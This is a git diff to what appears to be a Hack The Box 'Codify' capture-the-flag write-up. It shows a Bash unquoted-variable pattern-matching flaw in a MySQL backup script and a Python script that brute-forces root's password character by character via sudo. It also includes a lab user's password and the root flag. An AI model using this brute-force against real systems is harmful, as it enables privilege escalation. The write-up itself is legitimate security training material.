@@ -2,7 +2,7 @@
 title: HTB - Codify
 date: 2023-01-09
 categories: [CTF, Fullpwn]
-tags: [htb, hackthebox, nmap, http, webserver, mysql, vm2, node-js, hash, hashcat, bcrypt]
+tags: [htb, hackthebox, nmap, http, webserver, mysql, mysqldump, vm2, node-js, hash, hashcat, bcrypt]
 img_path: /assets/htb/fullpwn/codify/
 published: true
 ---
@@ -19,7 +19,7 @@ published: true
 > CONTENT HIDDEN - ACTIVE MACHINE!
 {: .prompt-warning}
 
-<!-- ## Info gathering
+## Info gathering
 
 ```bash
 $ sudo nmap -sS -A -Pn --min-rate 10000 -p- codify
@@ -251,26 +251,127 @@ Possible Hashs:
 [+] MySQL5 - SHA-1(SHA-1($pass))
 ```
 
-Sadly, after trying everything in our toolset, it seems that we can't crack the hash! Let's go back to the `mysql-backup.sh` script.
+Sadly, after trying everything in our toolset, it seems that we can't crack the hash! Let's go back to the `mysql-backup.sh` script. We can try replicating what the script is doing by executing each command ourselves:
+
+```bash
+joshua@codify:~$ mysql -u joshua -p'spongebob1' -h 127.0.0.1 -e "SHOW DATABASES;"
+mysql: [Warning] Using a password on the command line interface can be insecure.
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mydb               |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+
+joshua@codify:~$ mysql -u joshua -p'spongebob1' -h 127.0.0.1 -e "SHOW DATABASES;" | grep -Ev "(Database|information_schema|performance_schema)"
+mysql: [Warning] Using a password on the command line interface can be insecure.
+mydb
+mysql
+sys
+```
+
+So what this script does:
+1. Select the `mydb`, `mysql`, and `sys` databases.
+2. Exporting them one by one (backing them up) using `mysqldump` and stores them within `/var/backups/mysql` with the name `<db_name>.sql.gz`. 
+3. Compress each file using `gzip`.
+
+For executing this process, the `root` user's credentials are used.
+
+> [The complete `mysqldump` guide with examples](https://simplebackups.com/blog/the-complete-mysqldump-guide-with-examples/#what-is-mysqldump).
+
+After some time re-reading the script several times, the issue lies within the lines below:
+
+```bash
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+```
+
+This is an issue known as **unquoted variables**: how double quoted and unquoted variables are interpreted differently in Bash.
+
+> Info about [Quoting Variables](https://tldp.org/LDP/abs/html/quotingvar.html).
+
+Here is an example:
+
+```bash
+# defining a variable 
+$ variable1="a var containing five words"
+
+# passing the unquoted variable as an argument to a command
+$ echo This is $variable1
+This is a var containing five words
+```
+
+The `echo` command above interpreted the variable as five different arguments which is identical with the code below:
+
+```bash
+$ echo This is a var containing five words
+This is a var containing five words
+```
+
+If we know enclose the variable in double quotes, the command will interpret the variable as one single argument instead of 5 separate ones, which is usually the intended purpose of defining a variable! 
+
+In the example below, we create the variable `list` and because we then use it unquoted, instead of echoing the whole list, echoes its elements as separate arguments:
+
+```bash
+$ list="one two three"
+$ for a in $list # unquoted variable
+> do
+> echo "$a"
+> done
+one
+two
+three
+```
+
+If we now enclose the `list` variable in double quotes, the command will interpret it as a single argument, echoing the whole list:
+
+```bash
+$ for a in "$list" # double-quoted variable
+> do
+> echo "$a"
+> done
+one two three
+```
+
+> [Bash | Why should you put shell variables always between quotation marks ? (+ real world example)](https://medium.com/@stefan.paladuta17/bash-why-should-you-put-shell-variables-always-between-quotation-marks-real-world-example-ac794dd53a84).
+
+So, that is the base of the vulnerability that lies within the `[[ $DB_PASS == $USER_PASS ]]` lines. In brief, as mentioned [here](https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29): 
+
+> When the right-hand side of an `=` operator inside [`[[`](https://mywiki.wooledge.org/BashFAQ/031) is not quoted, bash does [**pattern matching**](https://mywiki.wooledge.org/glob) against it, instead of treating it as a string.
+
+As a result of that, we can create a simple [brute-forcing script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/htb/fullpwn/codify/brute_force.py) leveraging the ability to "*pattern-match*" each character and obtain `root`'s password:
 
 ```python
-import string
 import subprocess
-all = list(string.ascii_letters + string.digits)
-password = ""
-found = False
+import string
 
-while not found:
-    for character in all:
-        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
+# create a list with all alphanumeric characters
+charList = list(string.ascii_letters + string.digits)
+# set initial password as an empty string
+password = ""
+passwordMissing = True
+
+while passwordMissing:
+    # try every character in the list
+    for char in charList:
+        # define the command to be executed
+        command = f"echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh"
+        # 
         output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
 
+        # if this message (defined in the `mysql-back.sh` script) is within the output
         if "Password confirmed!" in output:
-            password += character
+            # append character in the password variable
+            password += char
+            # print the current state of the password
             print(password)
+            # don't iterate through the rest of the letters and go to next position instead
             break
     else:
-        found = True
+        passwordMissing = False
 ```
 
 By running the script, `root`'s password will be revealed:
@@ -308,6 +409,6 @@ joshua@codify:~$ su root
 Password:
 root@codify:/home/joshua# cat /root/root.txt
 1f62fde8d681b1567d8d4e677f7b0c3c
-``` -->
+```
 
 ![](machine_pwned.png){: width="65%" .normal}
